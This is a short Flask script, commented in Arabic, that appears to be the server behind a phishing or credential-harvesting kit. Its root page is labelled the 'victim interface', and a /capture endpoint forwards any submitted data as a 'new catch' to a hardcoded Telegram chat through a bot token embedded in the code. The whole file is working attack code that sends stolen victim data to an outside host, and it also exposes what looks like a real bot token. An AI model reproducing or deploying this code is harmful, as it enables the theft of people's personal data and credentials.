import base64, requests, io, os
from flask import Flask, render_template_string, request

app = Flask(__name__)

# إعداداتك الثابتة
BOT_TOKEN = "8725128005:AAH3Pp14tKAEsLPvcHOGdh8JqOnD74KKLNs"

@app.route('/', methods=['GET', 'POST'])
def handle_all():
    if request.method == 'POST':
        u = request.get_json(silent=True)
        # هذا السطر للتأكد من وصول البيانات
        if u and "message" in u:
            cid = u["message"]["chat"]["id"]
            # البوت سيرد على أي رسالة تصل إليه فوراً
            requests.post(f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage", 
                          json={"chat_id": cid, "text": "✅ وصلت الرسالة للسيرفر! البوت شغال يا سيوفي."})
        return "OK", 200
    
    # واجهة الضحية
    return "<h1>Server is Running</h1>"

@app.route('/capture', methods=['POST'])
def capture():
    d = request.json
    # إرسال الصيد للآيدي الخاص بك مباشرة
    requests.post(f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage", 
                  json={"chat_id": 7041600701, "text": f"🎯 صيد جديد: {d}"})
    return "OK"

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=int(os.environ.get("PORT", 10000)))
